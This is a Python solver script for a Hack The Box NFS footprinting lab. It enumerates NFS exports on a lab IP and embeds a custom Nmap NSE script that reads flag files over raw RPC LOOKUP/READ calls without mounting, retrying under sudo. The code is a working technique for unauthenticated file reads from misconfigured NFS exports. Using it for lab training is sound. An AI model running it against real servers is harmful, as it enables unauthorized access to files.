#!/usr/bin/env python3
"""NFS footprinting lab solver.

Uses the nfs_enum package for full recon, then reads flag files via
a custom NSE script that avoids a privileged mount.

To add a new target: add an entry to TARGETS below.
"""
from __future__ import annotations

import argparse
import re
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from nfs_enum import NfsOrchestrator, ScanConfig, ScanOptions, ScanProfile

# ---------------------------------------------------------------------------
# Target registry — add new IPs here
# ---------------------------------------------------------------------------
TARGETS: dict[str, str] = {
    "default": "10.129.202.5",
    # "lab2": "10.129.x.x",
}

OUTPUT_DIR = Path("nfs_recon")

# ---------------------------------------------------------------------------
# NSE script for reading files without mounting (avoids privileged port req)
# ---------------------------------------------------------------------------
_NSE_SCRIPT = r'''local rpc = require "rpc"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

portrule = shortport.port_or_service(111, "rpcbind", {"tcp", "udp"})

description = [[Read a specific file from an NFS export via RPC LOOKUP/READ without mounting.]]
author = "copilot"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}

action = function(host, port)
  local share = stdnse.get_script_args("nfsread.share")
  local file_path = stdnse.get_script_args("nfsread.file") or "flag.txt"
  local max_read = tonumber(stdnse.get_script_args("nfsread.maxread")) or 8192

  if not share then
    return "Missing script arg nfsread.share"
  end

  local nfs = rpc.NFS:new()

  local mnt_comm, handle_or_err = rpc.Helper.MountPath(host, port, share)
  if not mnt_comm then
    return "Mount failed: " .. tostring(handle_or_err)
  end

  local nfs_comm, nfs_err = rpc.Helper.NfsOpen(host, port)
  if not nfs_comm then
    rpc.Helper.UnmountPath(mnt_comm, share)
    return "NFS open failed: " .. tostring(nfs_err)
  end

  local function cleanup()
    rpc.Helper.NfsClose(nfs_comm)
    rpc.Helper.UnmountPath(mnt_comm, share)
  end

  local function lookup_path(start_handle, rel_path)
    local current = start_handle
    for segment in string.gmatch(rel_path, "[^/]+") do
      if segment ~= "." and segment ~= "" then
        local ok, lu = nfs:LookUp(nfs_comm, current, segment)
        if not ok then
          return nil, "LOOKUP failed for segment '" .. segment .. "': " .. tostring(lu)
        end
        current = lu.fhandle
      end
    end
    return current, nil
  end

  local function read_file(file_handle)
    local proc_read = 6
    local req = file_handle .. string.pack(">I8 I4", 0, max_read)
    local pkt = nfs_comm:EncodePacket(nil, proc_read, {type = rpc.Portmap.AuthType.UNIX}, req)

    if not nfs_comm:SendPacket(pkt) then
      return nil, "READ send failed"
    end

    local ok, data = nfs_comm:ReceivePacket()
    if not ok then
      return nil, "READ receive failed: " .. tostring(data)
    end

    local pos, header = nfs_comm:DecodeHeader(data, 1)
    if not header then
      return nil, "READ decode header failed"
    end

    local status
    pos, status = rpc.Util.unmarshall_uint32(data, pos)
    if status ~= rpc.NFS.StatCode[nfs_comm.version].NFS_OK then
      return nil, "READ status error: " .. tostring(status)
    end

    local follows
    pos, follows = rpc.Util.unmarshall_uint32(data, pos)
    if follows ~= 0 then
      local attrs
      pos, attrs = rpc.Util.unmarshall_nfsattr(data, pos, nfs_comm.version)
    end

    local count, eof, length, content
    pos, count = rpc.Util.unmarshall_uint32(data, pos)
    pos, eof = rpc.Util.unmarshall_uint32(data, pos)
    pos, length = rpc.Util.unmarshall_uint32(data, pos)
    pos, content = rpc.Util.unmarshall_vopaque(length, data, pos)

    return content, nil
  end

  local fh, lookup_err = lookup_path(handle_or_err, file_path)
  if not fh then
    cleanup()
    return lookup_err
  end

  local content, read_err = read_file(fh)
  cleanup()

  if not content then
    return read_err
  end

  return stdnse.format_output(true, {"share: " .. share, "file: " .. file_path, "content: " .. content})
end
'''


# ---------------------------------------------------------------------------
# Flag reading via NSE
# ---------------------------------------------------------------------------

def _read_flag_nse(host: str, nse_path: Path, export_path: str, use_sudo: bool) -> str:
    import subprocess
    base_cmd = [
        "nmap", "-Pn", "-p111",
        "--script", str(nse_path),
        "--script-args", f"nfsread.share={export_path},nfsread.file=flag.txt",
        host,
    ]
    cmd = (["sudo", "-n"] + base_cmd) if use_sudo else base_cmd
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    output = proc.stdout
    if proc.returncode != 0 and not output:
        raise RuntimeError(proc.stderr.strip() or f"nmap exited {proc.returncode}")
    m = re.search(r"content:\s*(.+)", output)
    if not m:
        raise RuntimeError(
            f"Flag not found in NSE output for {export_path}.\nOutput:\n{output}"
        )
    return m.group(1).strip()


def _read_flags(host: str, exports: list[str]) -> dict[str, str]:
    flags: dict[str, str] = {}
    with tempfile.TemporaryDirectory(prefix="nfs_solver_") as tmpdir:
        nse_path = Path(tmpdir) / "nfs-readfile.nse"
        nse_path.write_text(_NSE_SCRIPT, encoding="utf-8")

        for export in exports:
            for use_sudo in (False, True):
                try:
                    flags[export] = _read_flag_nse(host, nse_path, export, use_sudo)
                    break
                except Exception as e:
                    if use_sudo:
                        print(f"  [-] Could not read flag from {export}: {e}", file=sys.stderr)
    return flags


# ---------------------------------------------------------------------------
# Export classification
# ---------------------------------------------------------------------------

def _classify_exports(export_paths: list[str]) -> dict[str, str]:
    mapping: dict[str, str] = {}
    for path in export_paths:
        lower = path.lower()
        if lower.endswith("/nfsshare"):
            mapping["nfsshare"] = path
        elif lower.endswith("/nfs"):
            mapping["nfs"] = path
        else:
            # Store by last path component as key
            key = path.rstrip("/").rsplit("/", 1)[-1] or path
            mapping[key] = path
    return mapping


# ---------------------------------------------------------------------------
# Main solver
# ---------------------------------------------------------------------------

def solve(host: str, skip_recon: bool = False) -> None:
    print(f"\n=== NFS Lab Solver — target {host} ===\n")

    config = ScanConfig(
        target=host,
        output_dir=OUTPUT_DIR,
        profile=ScanProfile.STANDARD,
        options=ScanOptions(attempt_mount=True),
    )

    if not skip_recon:
        print("[*] Running nfs_enum package recon ...", file=sys.stderr)
        orchestrator = NfsOrchestrator(config)
        context = orchestrator.run()

        if not context.nfs_detected:
            print("[-] NFS not detected. Exiting.")
            return

        export_paths = [e.path for e in context.exports]
        print(f"[+] Exports found: {export_paths}", file=sys.stderr)

        report_path = config.target_output_dir / "summary" / "findings.md"
        if report_path.exists():
            print(f"[*] Report: {report_path}", file=sys.stderr)
    else:
        print("[*] Skipping recon (--skip-recon)", file=sys.stderr)
        # Fall back to direct showmount
        import subprocess
        result = subprocess.run(
            ["showmount", "-e", host], capture_output=True, text=True, timeout=30
        )
        export_paths = []
        for line in result.stdout.splitlines():
            m = re.match(r"^(/\S+)", line.strip())
            if m:
                export_paths.append(m.group(1))

    if not export_paths:
        print("[-] No exports found. Cannot read flags.")
        return

    classified = _classify_exports(export_paths)
    print(f"\n[*] Reading flags via NSE script ...\n", file=sys.stderr)
    flags = _read_flags(host, export_paths)

    if not flags:
        print("[-] No flags retrieved.")
        return

    print("\n=== FLAGS ===")
    for export, flag in flags.items():
        key = classified.get(export, export)
        print(f"  {export}: {flag}")

    # HTB-style Q&A output for /nfs and /nfsshare
    if "nfs" in classified and classified["nfs"] in flags:
        print(f"\nQ1 — /nfs flag:      {flags[classified['nfs']]}")
    if "nfsshare" in classified and classified["nfsshare"] in flags:
        print(f"Q2 — /nfsshare flag: {flags[classified['nfsshare']]}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Solve HTB NFS footprinting lab")
    parser.add_argument(
        "--target",
        default=TARGETS["default"],
        help=f"Target IP (default: {TARGETS['default']}). Named targets: {list(TARGETS.keys())}",
    )
    parser.add_argument(
        "--target-name",
        choices=list(TARGETS.keys()),
        help="Select a named target from the registry",
    )
    parser.add_argument(
        "--skip-recon",
        action="store_true",
        help="Skip nfs_enum recon phase and go straight to flag reading",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    host = TARGETS[args.target_name] if args.target_name else args.target
    solve(host, skip_recon=args.skip_recon)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
